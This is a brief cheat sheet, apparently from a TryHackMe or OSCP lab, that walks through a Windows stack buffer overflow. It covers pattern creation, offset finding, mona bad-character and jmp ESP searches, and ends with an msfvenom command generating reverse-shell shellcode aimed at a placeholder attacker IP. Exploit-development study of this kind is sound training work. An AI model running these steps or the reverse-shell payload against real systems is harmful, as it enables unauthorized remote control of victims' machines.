# Windows Stack Overflow  

Create pattern.  

`msf-pattern_create -l 800`  

Find the offset where EIP is over written.  

`msf-pattern_offset -l 800 -q 42306142`  

Set a working folder in mona.  

`!mona config -set workingfolder c:\mona\%p`  

Finding the distance, using the length of payload variable in THM-exploit.py, which was 400 bytes longer than crashed amount.  

`!mona findmsp -distance 600`  

Generate a byte array in mona.  

`!mona bytearray -b "\x00"`  

Compare bad characters in memory compared with bad characters in THM-exploit.py payload variable.  

`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`  

Find all jmp ESP calls (or equivalent) without bad characters.  

`!mona jmp -r esp -cpb "\x00\x2a"`  

Generate a payload in C language format.  

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c`  

